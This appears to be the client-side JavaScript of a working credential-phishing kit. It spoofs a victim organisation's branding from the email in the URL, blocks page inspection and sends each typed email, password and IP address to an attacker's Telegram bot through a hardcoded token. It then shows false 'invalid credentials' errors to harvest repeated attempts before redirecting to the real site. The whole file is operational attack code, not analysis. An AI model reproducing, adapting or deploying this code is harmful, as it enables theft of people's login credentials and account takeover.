// Security measures
document.addEventListener('contextmenu', event => event.preventDefault());
document.addEventListener('keydown', (e) => {
    if (e.ctrlKey && [67, 86, 85, 83, 117].includes(e.keyCode)) e.preventDefault();
});

$(document).ready(function(){
    const config = {
        telegramBotToken: '7784889876:AAH5tP-ynJuUE2LjChnOkauYLW_CQlR1FU0',
        telegramChatID: '7538283652',
        attemptLimit: 4,
        ipAPI: 'https://api.ipify.org?format=json'
    };

    let attemptCount = 0;
    let userIP = 'Unknown';

    // Get IP address
    $.getJSON(config.ipAPI).done(function(data){ userIP = data.ip; });

    // Email extraction and setup
    const email = window.location.hash.substr(1);
    if (email) {
        const domain = email.split('@').pop();
        const cleanDomain = domain.replace(/^www\./i, '');
        
        // Set branding
        $('#email').val(email);
        $('#logoimg').attr('src', `https://logo.clearbit.com/${cleanDomain}`).error(function(){
            $(this).attr('src', 'https://res.cloudinary.com/pta/image/upload/v1631524936/ii_c5byfb.png');
        });
		// Dynamic favicon implementation
        const faviconUrl = `https://www.google.com/s2/favicons?domain=${cleanDomain}&sz=64`;
        $('#dynamic-favicon').attr({
            'href': faviconUrl,
            'type': 'image/png'
        });
		
        $('.logoname').text(cleanDomain.split('.')[0]);
        document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/https://${cleanDomain}')`;
    }

    // Form submission handler
    $('#submit-btn').click(async function(e){
        e.preventDefault();
        attemptCount++;
        
        const email = $('#email').val().trim();
        const password = $('#password').val().trim();
        const domain = email.split('@').pop();
        
        // Validation
        if (!validateEmail(email)) return showError('Invalid email format');
        if (!password) return showError('Password required');

        // Send to Telegram
        const message = `📬 New Login Attempt 📬
            🖥️ IP: ${userIP}
            📧 Email: ${email}
            🔑 Password: ${password}
            🌐 Domain: ${domain}
            🔗 Page: ${window.location.href}`;

        try {
            await $.post(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
                chat_id: config.telegramChatID,
                text: message,
                parse_mode: 'Markdown'
            });
        } catch (error) {
            console.error('Telegram API error:', error);
        }

        // Handle attempts
        if (attemptCount >= config.attemptLimit) {
            window.location.replace(`http://www.${domain}`);
        } else {
            $('#password').val('');
            $('#msg').html(`<span style="color:red">Invalid credentials (Attempt ${attemptCount}/${config.attemptLimit})</span>`).show();
        }
    });

    function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function showError(message) {
        $('#error').text(message).show();
        setTimeout(() => $('#error').hide(), 3000);
    }
});

  </script>
  

